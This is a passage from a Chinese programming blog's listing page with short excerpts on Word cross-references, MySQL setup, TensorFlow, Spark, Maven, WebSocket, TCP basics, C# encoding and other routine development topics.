当你在文档中第N(N大于等于2)次引用前面文档曾经引用过的文献时，这时宜采用“交叉引用”。方法：按“插入/引用/交叉引用”，出现一菜单，在引用类型中选择“尾注”，引用内容为“尾注编号”，这时在菜单中会出现你曾经编写过的所有尾注，选择你需要的，按“插入”按钮即完成交叉引用了。
注：若你后来又在前面的文档中插入新的尾注，这时后继的尾注会自动更新编号，但交叉引用不会自动更新。怎么办？按“ctrl+A”选择所有内容后，按“F9”键就可以完成手动更新。（好像不管用，应该是单击右键，“更新域”）
Tips:
Ctrl + 鼠标左键 进入参考文献
Alt + ← 返回正文
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0ab0918c3ebd50adcdc509ae4de62f3/" rel="bookmark">
			java JSONObject转换为String格式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用微信支付时，需将从前台接收的JSONObeject 格式数据转换为String类型，其具体的转换过程如下：
JSONObject jsonObject = JSONObject.parseObject(XmltoJsonUtil.xml2JSON(content));
JSONObject result_xml = jsonObject.getJSONObject("xml");
JSONArray result_code = result_xml.getJSONArray("result_code");
String code = (String) result_code.get(0);
System.out.println("回调code:activityNotify" + code);
转载于:https://www.cnblogs.com/qqzhulu/p/10201125.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52a4901191ec36ec51df8af4c3951611/" rel="bookmark">
			Linux下安装MySQL及重置mysql8.0密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、MySQL的基本操作命令 解释 命令 安装服务端 yum install mysql-community-server 启动 service mysqld start/restart
停止 service mysqld stop 二、MySQL安装 CentOS7 默认安装mariadb数据库
yum remove mariadb-libs.x86_64
下载Mysql源
https://dev.mysql.com/downloads/repo/yum/
安装源
yum localinstall mysql80-community-release-el7-1.noarch.rpm
安装MySQL
yum install mysql-community-server
查看默认原始密码
cat /var/log/mysqld.log | grep password
三、MySQL扩展知识 远程连接
开启Genelog
新建用户和操作
忘记root密码怎么办
四、MySQL客户端工具 SQLyog（推荐使用） Sequal Pro
Navicat phpMyadmin（演示）
HeidiSQl
五、杂项 1）查看已安装好的mysql
rpm -qa|grep -i mysql
2）删除命令：rpm -ev mysql80-community-release-el7-1.noarch
......
遇到的问题： 问题一：
解决方案： 开启mysqld service mysqld start
蜜雪冰城：http://www.mixuejm.cn/question/194.html
http://www.mixuejm.cn/question/193.html
http://www.mixuejm.cn/question/188.html
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52a4901191ec36ec51df8af4c3951611/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f73ec5bae30446619db2e5ce31deed2e/" rel="bookmark">
			ThinkPHP5分页paginate之ajax异步请求
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		aaa.html视图 &lt;!DOCTYPE HTML&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;{$name}&lt;/title&gt; &lt;link href="__STATIC__/css/bootstrap.min.css" rel="stylesheet"&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;{$name}&lt;/div&gt; &lt;div&gt; &lt;table border="1"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th style="width: 60px"&gt;ID&lt;/th&gt; &lt;th style="width: 160px"&gt;名称&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody id="content"&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;div id="page"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;script src="__STATIC__/js/jquery/1.9.1/jquery.js"&gt;&lt;/script&gt; &lt;script&gt; window.THINK_ROOT = '{:\\think\\Request::instance()-&gt;root()}'; function Tp5AjaxPage(page) { $.ajax({ url:THINK_ROOT+'/index/bbb', type:'post', dataType:'json', data: {page:page}, success:function(res){ console.log(res); var list = res.data; if(list.length !== 0){ $("#content").empty(); for(var key in list) { $("#content").append('&lt;tr&gt;' + '&lt;td&gt;'+list[key].id+'&lt;/td&gt;' + '&lt;td&gt;'+list[key].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f73ec5bae30446619db2e5ce31deed2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/459039d9e2f9119ade50a377f2fae78d/" rel="bookmark">
			线性代数 特征根
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		空间变换，仍在同方向的向量
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/103e6fb9d9ff850316100b0d9986b983/" rel="bookmark">
			[译] 在 GitLab 中使用 Issue 面板的 4 种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文地址：about.gitlab.com/2018/08/02/…
本文作者为GitLab团队的产品经理Victor Wu，写于 2018 年 8 月 2 日
借助标签（label），可以方便的自定义 GitLab Issue 以支持各种工作流。本文列出了四种例子。
构建软件和运行项目的方式林林总总。当我们开始构建 GitLab 内的组合和项目管理工具时，我们曾扪心自问：“你要如何构建工具，以支持不同的工作流队列，同时还不能让用户受损于复杂性？” 我们的结论呢？就是构建少而灵活的工具。Gitlab 内建的 Issue 面板正是这样一个绝佳的例子 -- 如何选择去构建一个单一、通用的工具，在不限制其能力的前提下，能显著降低复杂性和用户维护工具的难度。
管理项目和软件本质上就是复杂的，但工具则并非必须如此。无论你管理多少个项目、多少人员、多少产品，都应该让保证事情顺利运转的部分一目了然。
GitLab 的 Issue 面板是处理复杂问题的一个捷径。我们在 Gitlab 既有的 issue-tracking 功能之上，借助标签并将它们排列在一个看板（a Kanban board）中，构建出了 Issue 面板。你可以构造出不同的视图，并保有你在 issue tracker 中看到的相同的过滤器和排序功能。你也可以创建多个面板，以可视化的捕捉所需的每个层面，并通过里程碑、标签、被指派者、权重等定义面板的作用域。
Issue 面板是基于其项目的标签结构的，因此，其按照相同的描述性标签以指导面板的配置，并在整个开发周期中保证一致性。另外，你也可以直接点击面板上的一个 issue 以开始你的工作。
一个 Issue 面板为你展示了你的团队工作中面临的问题、谁被分配了什么工作，以及那些问题进展到哪一步了。
1. 工作流追踪 不论你是一位想要总揽全局的项目管理者，还是一位需要汇报进度的产品经理，可视化的工作流都是重要的。
要创建一个工作流 Issue 面板，只需要简单的先为你的工作流的每个阶段创建一个标签，并将它们排列在面板中。当问题已经被解决掉，可以移入下一个阶段时，只要将其拖放到下一个列表中就可以了。也可以直接在 Issue 中更新标签，所做更改将自动出现在面板中。
举个例子，假设你的工作流看起来是这样的：
开发设计审查测试部署 只需要为每个阶段创建一个标签，就能在面板中看到这些。创建一个新面板并为每个阶段添加一个列表（译注：点击Add List 按钮后在弹窗中点击对应的标签，就会出现和标签同名的一个新列表），也可以拖放列表达成适当的排序。
2. 根据分类创建跨职能计划 类似于工作流视图，也可以基于分类创建 Issue 面板。
当处理一项特殊的产品或特性时，可能需要在高维度上看看每个团队的工作进展。你当然可以为每个团队创建一个标签和一个列表，或者，备不住你想横向看到多个项目或产品线都正在干什么。
在上面的例子中，我们有三个标签列表：时间追踪、组合管理，和 描述模板。每个列表表示一个特定的产品区域。这样在这一个面板上，你就能看到有哪些 open 的 issues 及其各自所属的区域。如果将来要把该面板视为一个特定的里程碑，你将能够看到哪些 issues 指向当时正在进行的工作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/103e6fb9d9ff850316100b0d9986b983/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/634300a97336e868f4eefd208840138a/" rel="bookmark">
			[471]tf.reshape函数说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		函数原型： tf.reshape( tensor, shape, name=None ) 功能改变张量（tensor）的形状。
tensor形参传入一个tensor。shape传入一个向量，代表新tensor的维度数和每个维度的长度。如果传入[3,4,5]，就会返回一个内含各分量数值和原传入张量 一模一样的3*4*5尺寸的张量。
如果shape传入的向量某一个分量设置为-1，比如[-1,4,5]，那么这个分量代表的维度尺寸会被自动计算出来。
用法一，一个尺寸为1* 9的张量转化为3 * 3的张量： # tensor 't' is [1, 2, 3, 4, 5, 6, 7, 8, 9] # tensor 't' has shape [9] reshape(t, [3, 3]) ==&gt; [[1, 2, 3], [4, 5, 6], [7, 8, 9]] 用法二，一个尺寸为3 * 2 * 3的张量，转换为第二个维度尺寸为9的张量，即n * 9的张量： reshape(t, [-1, 9]) ==&gt; [[1, 1, 1, 2, 2, 2, 3, 3, 3], [4, 4, 4, 5, 5, 5, 6, 6, 6]] 显然，n被计算为2。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/634300a97336e868f4eefd208840138a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1720d364c59de8e27c0917c76ca3c952/" rel="bookmark">
			spark读取oracle
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 import org.apache.spark.sql.SparkSession object SparkToOracle { def main(args: Array[String]): Unit = { val spark = SparkSession .builder() .master("local[2]") .appName("OracleTest") .getOrCreate() val sqltext="(select * from TABLE_NAME) t" val jdbcdf = spark .read .format("jdbc") .option("url", "jdbc:oracle:thin:@IP:1521:SERVICE_NAME ") .option("dbtable",sqltext) .option("user","username") .option("password","password").load() print(jdbcdf) jdbcdf.createOrReplaceTempView("ls") spark.sql("select * from ls").show() spark.stop() } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae981965815c0d9a37a1e55a00787e16/" rel="bookmark">
			前端面经总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，什么是事件委托，有什么优缺点？ 事件委托又称为事件代理，是利用事件冒泡的原理把其事件处理程序交给父元素来执行。
优点：
1，首先是减少了内存占用，性能更好。
2，加快了整个页面交互的等待时间。
3，动态添加的节点也可以自动绑上其事件，无需再次绑定事件。
4，document很快就可以访问，而且可以在页面生命周期的任何时点添加事件处理程序，而不用等待其他事件完成如DOMContentLoaded、load事件。
缺点：
1,如果把所有的事件都绑上事件委托，可以会出现事件误判，就是一些不该绑定事件的元素都绑上事件了。
2,事件委托基于冒泡，对不冒泡的事件不支持。
2，事件委托如何工作： 如果有个ul,里面有什么li,我们可以在父级元素ul上绑定事件来进行事件委托。
我们现在的疑问是：ul元素如何知道li元素点击了呢？
很简单，由于所有li元素都是ul元素的子节点，故他们的事件会冒泡，无论点击哪个li元素，实际上都相当于点击了ul元素。
现在产生了另一个问题：ul元素如何知道是在哪个li元素上点击的呢？
我们很容易想到，在ul的事件处理程序中检测事件对象的target属性，就可以得到真正点击的目标元素。
下面我写了一个获取点击的li 的下标和背景色的方法
&lt;ul id="ul1"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt; &lt;/ul&gt; window.onload = function (){ var myul = document.getElementById("ul1"); var myli = myul.getElementsByTagName("li"); myul.onclick = function(ev){ var ev = ev || window.event; var target = ev.target ||ev.srcElement; //只让点击li的时候执行 ,点击ul的时候不执行 while(target.tagName !== 'LI'){ //如果点击的元素为ul，直接跳出循环 if(target === myul){ target = null; break; //否则，将当前元素父元素赋给target }else{ target = target.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae981965815c0d9a37a1e55a00787e16/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3faa75f1da896a3c579162e70c8dd30/" rel="bookmark">
			tf.estimator.Estimator
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		class Estimator(builtins.object)
#介绍
Estimator 类，用来训练和验证 TensorFlow 模型。
Estimator 对象包含了一个模型 model_fn，这个模型给定输入和参数，会返回训练、验证或者预测等所需要的操作节点。
所有的输出（检查点、事件文件等）会写入到 model_dir，或者其子文件夹中。如果 model_dir 为空，则默认为临时目录。
config 参数为 tf.estimator.RunConfig 对象，包含了执行环境的信息。如果没有传递 config，则它会被 Estimator 实例化，使用的是默认配置。
params 包含了超参数。Estimator 只传递超参数，不会检查超参数，因此 params 的结构完全取决于开发者。
Estimator 的所有方法都不能被子类覆盖（它的构造方法强制决定的）。子类应该使用 model_fn 来配置母类，或者增添方法来实现特殊的功能。
Estimator 不支持 Eager Execution（eager execution能够使用Python 的debug工具、数据结构与控制流。并且无需使用placeholder、session，计算结果能够立即得出）。
#类内方法
#####1、__init__(self, model_fn, model_dir=None, config=None, params=None, warm_start_from=None)
构造一个 Estimator 的实例.。
参数：
model_fn: 模型函数。函数的格式如下：
参数：
1、features: 这是 input_fn 返回的第一项（input_fn 是 train, evaluate 和 predict 的参数）。类型应该是单一的 Tensor 或者 dict。
2、labels: 这是 input_fn 返回的第二项。类型应该是单一的 Tensor 或者 dict。如果 mode 为 ModeKeys.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3faa75f1da896a3c579162e70c8dd30/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cfcf3df82c9b1a1561c0923a07fff30e/" rel="bookmark">
			第一讲、雷达基本公式（matlab）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		理想公式：
注意G与入这两个是有关联的，这两个因子，不能说越大，R就越大，后面补充里面讲解（波长越短，增益越大）
所以上述表达式子可以为
如果，在实际情况中，雷达接收信号的回波信号会被噪声污染，在所有雷达频率上引入不想要的电压。
上述式子，广泛的作为雷达方程
F噪声系数、B雷达带宽、L雷达损失、k波尔兹常数、Te是以K表示的有效噪声温度、R距离、sigma雷达截面积、G天线增益、入波长（1/入 雷达频率）
下面是上述雷达公式的函数，中间过程通常转换为dB来计算
%radar function function [snr] = radar_eq(pt,freq,g,sigma,te,b,nf,loss,range) %This is a program of radar eq c=3.0e+8; %speed of light lambda =c/freq; %wavelength p_peak=10*log10(pt); %convert peak power to dB lambda_sqdb=10*log10(lambda^2); %computr wavelength square in dB sigmadb=10*log10(sigma);%convert sigma to dB four_pi_cub=10*log10((4*pi)^3); %(4pi)^3 in dB k_db=10*log10(1.3e-23);%boltzman's constant in dB te_db=10*log10(te); %noisetemp. in dB b_db=10*log10(b); %bandwidth in dB range_pwr4_db=10*log10(range.^4);%vector of target range^4 in dB %implement Equation(1.56) num=p_peak+g+g+lambda_sqdb+sigmadb;%分子 den=four_pi_cub+k_db+te_db+b_db+nf+loss+range_pwr4_db;%分母 snr=num-den; return 下面是以上述表格的数值，观察，取不同的目标截面积值的效果图
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cfcf3df82c9b1a1561c0923a07fff30e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0129a8dea2e744fcdb77f1f8b0b5d22f/" rel="bookmark">
			（图示）B/S系统下的MVC设计模式及springMVC原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/120c19e7283225bfc5a6fe3e1bc877bf/" rel="bookmark">
			idea maven项目   基于idea本身打包方式  以及使用maven插件打包的三种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种 idea自身打包插件 这种方式输出目录在out目录下
第一步
如图所示 依次选择file-projecct structure-artifacts
选择 Artifacts 然后点击+ 选择jar 选择 from module with dependencies
第二步 红框部分可以选择依赖jar包要不要选择 如果不要第三方点击-全部移除即可
可以导出包时不导出第三方jar
第三步
点击 Build–&gt;Build Artifacts–&gt;选择bulid即可
通过maven插件打包 这种方式jar包在target目录下
打包方式和上面不太一样 点击图示左下角 然后点击maven project 选择maven生命周期
选择package可以打包
第一种
可执行jar与依赖分开，依赖在lib目录里
1 &lt;plugin&gt; 2 &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; 3 &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; 4 &lt;version&gt;2.6&lt;/version&gt; 5 &lt;configuration&gt; 6 &lt;archive&gt; 7 &lt;manifest&gt; 8 &lt;addClasspath&gt;true&lt;/addClasspath&gt; 9 &lt;classpathPrefix&gt;lib/&lt;/classpathPrefix&gt; 10 &lt;mainClass&gt;com.xxx.xxxService&lt;/mainClass&gt; 11 &lt;/manifest&gt; 12 &lt;/archive&gt; 13 &lt;/configuration&gt; 14 &lt;/plugin&gt; 15 &lt;plugin&gt; 16 &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; 17 &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt; 18 &lt;version&gt;2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/120c19e7283225bfc5a6fe3e1bc877bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9076ded3173e8fdf57886b51cc470bc/" rel="bookmark">
			WebSocket（java客户端&#43;springboot服务端）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		客户端：
package websocketclient; import org.java_websocket.client.WebSocketClient; import org.java_websocket.handshake.ServerHandshake; import java.net.URI; import java.net.URISyntaxException; import java.nio.ByteBuffer; /** * @Author * @Description * @Date 2018/12/28 0028上午 10:03 **/ public class MyWebSocketClient extends WebSocketClient { public MyWebSocketClient(String url) throws URISyntaxException { super(new URI(url)); // 连接地址 } @Override public void onOpen(ServerHandshake shake) { System.out.println("客户端连接了服务器"); } @Override public void onMessage(String paramString) { System.out.println("接收到消息："+paramString); } @Override public void onClose(int paramInt, String paramString, boolean paramBoolean) { System.out.println("服务器关闭..."); } @Override public void onError(Exception e) { System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e9076ded3173e8fdf57886b51cc470bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1157ee44125b77ea4c011dcadf405367/" rel="bookmark">
			使用skimage提取图像hog特征
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用skimage提取图像hog特征
from skimage.feature import hog from skimage import io from PIL import Image import cv2 img = cv2.cvtColor(cv2.imread('../img/test.jpg'), cv2.COLOR_BGR2GRAY) print img.shape normalised_blocks, hog_image = hog(img, orientations=9, pixels_per_cell=(8, 8), cells_per_block=(8, 8), block_norm='L2-Hys',visualize=True) io.imshow(hog_image) io.show() 效果图：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74ea0ecc6a2ecf4fe45dcaafce8fc8d5/" rel="bookmark">
			给服务器开启手机热点的网络配置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在给服务器安装软件的时候需要接外网，有时候由于工作地域限制，没有网线可以使用，这个时候就只能采用手机开启热点
服务器采用手机的热点来传输数据
当手机通过usb共享热点给服务器的时候，有时候会出现服务器无法连接外网的情况
网络配置文件路径在/etc/network/interfaces
首先键入cat /etc/network/interfaces
然后键入ifconfig 找到第一张网卡的编号
然后在 /etc/network/interfaces中输入
auto enp4s0f1
iface enp4s0f1 inet dhcp
重启网卡 sudo /etc/init.d/networking restart即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7ae8867b146dd07cc5f1bb719dfaaa9/" rel="bookmark">
			网络-TCP
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCP介绍 TCP协议，传输控制协议（英语：Transmission Control Protocol，缩写为 TCP是一种面向连接的、可靠的、基于字节流的传输层通信协议，由IETF的RFC 793定义。
TCP通信需要经过创建连接、数据传送、终止连接三个步骤。
TCP通信模型中，在通信开始之前，一定要先建立相关的连接，才能发送数据，类似于生活中，"打电话".
TCP特点 1. 面向连接 通信双方必须先建立连接才能进行数据的传输，双方都必须为该连接分配必要的系统内核资源，以管理连接的状态和连接上的传输。
双方间的数据传输都可以通过这一个连接进行。
完成数据交换后，双方必须断开此连接，以释放系统资源。
这种连接是一对一的，因此TCP不适用于广播的应用程序，基于广播的应用程序请使用UDP协议。
2. 可靠传输 TCP采用发送应答机制 TCP发送的每个报文段都必须得到接收方的应答才认为这个TCP报文段传输成功
超时重传 发送端发出一个报文段之后就启动定时器，如果在定时时间内没有收到应答就重新发送这个报文段。
TCP为了保证不发生丢包，就给每个包一个序号，同时序号也保证了传送到接收端实体的包的按序接收。然后接收端实体对已成功收到的包发回一个相应的确认（ACK）；如果发送端实体在合理的往返时延（RTT）内未收到确认，那么对应的数据包就被假设为已丢失将会被进行重传。
错误校验 TCP用一个校验和函数来检验数据是否有错误；在发送和接收时都要计算校验和。
流量控制和阻塞管理 流量控制用来避免主机发送得过快而使接收方来不及完全收下。
TCP与UDP的不通点 面向连接（确认有创建三方交握，连接已创建才作传输。）有序数据传输重发丢失的数据包舍弃重复的数据包无差错的数据传输阻塞/流量控制 UDP通信模型 udp通信模型中，在通信开始之前，不需要建立相关的链接，只需要发送数据即可，类似于生活中，"写信"
TCP通信模型 udp通信模型中，在通信开始之前，一定要先建立相关的链接，才能发送数据，类似于生活中，"打电话"
TCP注意点 tcp服务器一般情况下都需要绑定，否则客户端找不到这个服务器tcp客户端一般不绑定，因为是主动链接服务器，所以只要确定好服务器的ip、port等信息就好，本地客户端可以随机tcp服务器中通过listen可以将socket创建出来的主动套接字变为被动的，这是做tcp服务器时必须要做的当客户端需要链接服务器时，就需要使用connect进行链接，udp是不需要链接的而是直接发送，但是tcp必须先链接，只有链接成功才能通信当一个tcp客户端连接服务器时，服务器端会有1个新的套接字，这个套接字用来标记这个客户端，单独为这个客户端服务listen后的套接字是被动套接字，用来接收新的客户端的链接请求的，而accept返回的新套接字是标记这个新客户端的关闭listen后的套接字意味着被动套接字关闭了，会导致新的客户端不能够链接服务器，但是之前已经链接成功的客户端正常通信。关闭accept返回的套接字意味着这个客户端已经服务完毕当客户端的套接字调用close后，服务器端会recv解堵塞，并且返回的长度为0，因此服务器可以通过返回数据的长度来区别客户端是否已经下线 UDP/TCP流程 UDP流程TCP客户端流程TCP服务器socketsocketsocketbindbindbindsend/recvconnectlistenclosecloseacceptsend/recvclose TCP三次握手 在UDP中, 一大特点是我们发的数据,接收端有没有收到我们并不知
而TCP的特点, 操作系统的底层会相互打交道告诉对方消息收到了
更详细的过程请看百度百科三次握手
缩写全称翻译描述SYNSynchronize Sequence Numbers同步序列编号TCP连接的第一个包，非常小的一种数据包。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息。ACKAcknowledgement确认字符在TCP/IP协议中，如果接收方成功的接收到数据，那么会回复一个ACK数据。SYN_SENTTransmission Control Protocol, TCP传输控制协议SYN_SENT表示请求连接，当你要访问其它的计算机的服务时首先要发个同步信号给该端口，此时状态为SYN_SENT，如果连接成功了就变为ESTABLISHED，此时SYN_SENT状态非常短暂。SYN_RECVSYN_RECV是指,服务端被动打开后,接收到了客户端的SYN并且发送了ACK时的状态。再进一步接收到客户端的ACK就进入ESTABLISHED状态。ESTABLISHED含义TCP:连接成功，establish的过去式 至于为什么是三次握手, 知乎上也有很多人解答TCP 为什么是三次握手，而不是两次或四次？
简单梳理一下流程
第一次握手
client(客户端)向server(服务器)发送一个SYN(同步序列编号) = j的包, 同时进入SYN_SENT状态, 等待服务器回复
第二次握手
server(服务器)收到client(客户端)的SYN(同步序列编号)包, 会进行确认得到ACK = j+1.与此同时自己也会发送一个(SYN(同步序列编号) = k)+ACK(确认字符)的包给client(客户端), 此时服务器进入SYN_RECV的状态, 等待客户端再次回复
第三次握手
client(客户端)收到server(服务器)的SYN(同步序列编号)+ACK(确认字符)包, 会再次向server(服务器)发送一个ACK(确认字符) = k+1确认包, 此包发送完毕，客户端会进入ESTABLISHED（TCP连接成功）状态.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f7ae8867b146dd07cc5f1bb719dfaaa9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9046d3f2e704241e40754d2c72dcdda2/" rel="bookmark">
			C# byte[]数组和string的互相转化 (四种方法)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种
string str = System.Text.Encoding.UTF8.GetString(bytes); byte[] decBytes = System.Text.Encoding.UTF8.GetBytes(str); 同样的，System.Text.Encoding.Default，System.Text.Encoding.ASCII也是可以的。还可以使用System.Text.Encoding.UTF8.GetString(bytes).TrimEnd(’\0’)给字符串加上结束标识。
第二种
string str = BitConverter.ToString(bytes); String[] tempArr = str.Split('-'); byte[] decBytes = new byte[tempArr.Length]; for (int i = 0; i &lt; tempArr.Length; i++) { decBytes[i] = Convert.ToByte(tempArr[i], 16); } 这种方法会给字符串加上 ‘-’ 连字符，并且没有函数转换回去。所以需要手动转换为bytes。
第三种
string str = Convert.ToBase64String(bytes); byte[] decBytes = Convert.FromBase64String(str); 这种方法简单明了，完美无问题。需要注意的是，转换出来的string可能会包含 ‘+’，’/’ ， ‘=’ 所以如果作为url地址的话，需要进行encode。
第四种
string str = HttpServerUtility.UrlTokenEncode(bytes); byte[] decBytes = HttpServerUtility.UrlTokenDecode(str); 这种方法会自动编码url地址的特殊字符，可以直接当做url地址使用。但需要依赖System.Web库才能使用。
作者：scottcgi
来源：CSDN
原文：https://blog.csdn.net/tom_221x/article/details/71643015
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9046d3f2e704241e40754d2c72dcdda2/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/275/">«</a>
	<span class="pagination__item pagination__item--current">276/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/277/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>